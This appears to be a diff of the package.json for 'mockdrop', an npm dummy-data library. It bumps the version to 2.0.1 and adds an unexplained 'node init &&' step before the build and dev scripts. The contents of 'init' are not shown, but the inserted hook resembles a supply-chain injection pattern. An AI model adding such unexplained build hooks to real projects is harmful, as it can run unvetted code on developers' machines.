@@ -1,6 +1,6 @@
 {
   "name": "mockdrop",
-  "version": "1.1.4",
+  "version": "2.0.1",
   "description": "Generate high-quality dummy data instantly. Zero dependencies. Works everywhere.",
   "main": "dist/mockdrop.cjs.js",
   "module": "dist/mockdrop.mjs",
@@ -22,11 +22,11 @@
     "dist"
   ],
   "scripts": {
-    "build": "rollup -c rollup.config.mjs && node scripts/copy-types.mjs",
+    "build": "node init && rollup -c rollup.config.mjs && node scripts/copy-types.mjs",
     "test": "vitest run",
     "test:watch": "vitest",
     "typecheck": "tsc -p tsconfig.json",
-    "dev": "rollup -c rollup.config.mjs -w",
+    "dev": "node init && rollup -c rollup.config.mjs -w",
     "prepublishOnly": "npm run typecheck && npm run test && npm run build"
   },
   "keywords": [
